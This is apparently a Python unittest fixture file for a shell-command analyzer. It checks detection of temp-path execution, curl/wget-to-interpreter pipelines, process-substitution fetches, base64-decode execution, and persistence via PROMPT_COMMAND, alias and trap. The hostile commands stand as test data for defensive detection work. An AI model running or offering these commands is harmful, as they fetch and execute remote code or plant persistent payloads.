"""Adversarial shell fixtures from independent review B (B-6, B-7, B-8).

Each case is (text, expected patterns, limitation that must be present or None).
A case expecting [] with a limitation means: do not invent a finding, but do not
report clean either.
"""
import unittest

from falsicore.shell_syntax import analyze

T = "TEMP_PATH_IN_EXECUTION"
R = "REMOTE_SCRIPT_PIPELINE"
B = "BASE64_DECODE_EXECUTION_CONTEXT"

CASES = {
    # B-6: wrappers, compound commands and command-valued settings
    "function_body": ("f() { /tmp/x; }", [T], None),
    "brace_group": ("{ /tmp/x; }", [T], None),
    "while_condition": ("while /tmp/x; do :; done", [T], None),
    "timeout_wrapper": ("timeout 5 /tmp/x", [T], None),
    "timeout_signal": ("timeout -s KILL 5 bash /tmp/x", [T], None),
    "nice_wrapper": ("nice -n 5 /tmp/x", [T], None),
    "stdbuf_wrapper": ("stdbuf -oL /tmp/x", [T], None),
    "xargs_wrapper": ("xargs -n1 /tmp/x", [T], None),
    "alias_value": ("alias ls='/tmp/x'", [T], None),
    "prompt_command_export": ("export PROMPT_COMMAND='/tmp/x'", [T], None),
    "prompt_command_assign": ("PROMPT_COMMAND='curl https://e.invalid | bash'", [R], None),
    "trap_action": ("trap '/tmp/x' EXIT", [T], None),
    "stdin_redirect_script": ("bash < /tmp/evil.sh", [T], None),
    "fd_redirect_not_operand": ("bash 2>/dev/null /tmp/evil.sh", [T], None),
    "procsub_remote_shell": ("bash <(curl -s https://e.invalid)", [R], None),
    "procsub_remote_source": ("source <(curl -s https://e.invalid)", [R], None),
    "curl_python": ("curl -s https://e.invalid | python3", [R], None),
    "wget_perl": ("wget -qO- https://e.invalid | perl", [R], None),
    "decode_python": ("base64 -d blob | python3", [B], None),
    "perl_script": ("perl /tmp/x.pl", [T], None),
    "node_script": ("node /tmp/x.js", [T], None),
    "command_substitution_exec": ("x=$(bash /tmp/x)", [T], None),
    "backtick_exec": ("echo `bash /tmp/x`", [T], None),
    "herestring_to_shell": ("bash <<< '/tmp/x'", [T], None),
    "combined_lc": ("bash -lc 'source /tmp/x'", [T], None),
    # B-7: comments and backslashes must not join or swallow lines
    "comment_backslash_does_not_continue": ("true # note \\\n/tmp/payload", [T], None),
    "comment_pipe_does_not_continue": ("curl https://e.invalid # x |\n/tmp/payload", [T], None),
    "escaped_backslash_ends_line": ("echo C:\\\\\n/tmp/payload", [T], None),
    "real_continuation": ("bash \\\n/tmp/payload", [T], None),
    # B-8: multi-line strings are data
    "multiline_single_quoted_data": ("MSG='\ncurl http://x | bash\n'", [], None),
    "multiline_double_quoted_data": ('MSG="\nbash /tmp/x\n"', [], None),
    # unresolved program identity: limitation, not a guessed finding
    "expanded_command_word": ('$CMD /tmp/x', [], "EXPANSION_NOT_RESOLVED"),
    "expanded_script": ('bash "$SCRIPT"', [], "EXPANSION_NOT_RESOLVED"),
    "inline_perl": ("perl -e 'system(1)'", [], "INLINE_INTERPRETER_CODE_NOT_ANALYZED"),
    "unterminated_quote": ("echo 'abc", [], "UNPARSED_QUOTING"),
    # negatives: expansions in data positions are not limitations
    "single_quoted_dollar_is_data": ("PS1='${debian_chroot:+($debian_chroot)}\\u@\\h'", [], None),
    "echo_variable": ('echo "$HOME"', [], None),
    "case_statement": ("case $- in\n *i*) ;;\n *) return;;\nesac", [], None),
    "case_pattern_with_expansion_is_data": ('case ":${PATH}:" in\n *:"$HOME/x":*) ;;\n *) export PATH="$HOME/x:$PATH" ;;\nesac', [], None),
    "case_body_still_analysed": ("case $x in\n a|b) bash /tmp/x ;;\nesac", [T], None),
    "data_arg_tmp": ("cp /tmp/a /tmp/b", [], None),
}

NO_LIMIT = {"single_quoted_dollar_is_data", "echo_variable", "case_statement", "data_arg_tmp",
            "case_pattern_with_expansion_is_data",
            "multiline_single_quoted_data", "multiline_double_quoted_data"}


class AdversarialShellFixtures(unittest.TestCase):
    pass


def make(text, expected, limitation, name):
    def test(self):
        result = analyze(text)
        self.assertEqual(result["patterns"], expected, result)
        if limitation:
            self.assertIn(limitation, result["limitations"], result)
        if name in NO_LIMIT:
            self.assertEqual(result["limitations"], [], result)
    return test


for _name, (_text, _expected, _limit) in CASES.items():
    setattr(AdversarialShellFixtures, "test_" + _name, make(_text, _expected, _limit, _name))


class LineAttributionTests(unittest.TestCase):
    def test_match_reports_line_of_command_not_of_continuation(self):
        result = analyze("echo a\n\nbash \\\n  /tmp/x\n")
        self.assertEqual(result["matches"], [{"line": 3, "patterns": [T]}])

    def test_sourced_literals_are_reported_for_the_caller(self):
        result = analyze('[ -f ~/.bash_aliases ] && . ~/.bash_aliases\nsource "$HOME/.x"')
        self.assertEqual(len(result["sourced"]), 2)
        self.assertEqual(result["sourced"][0], "~/.bash_aliases")
        self.assertIn("VAR:HOME", result["sourced"][1])


if __name__ == "__main__":
    unittest.main()
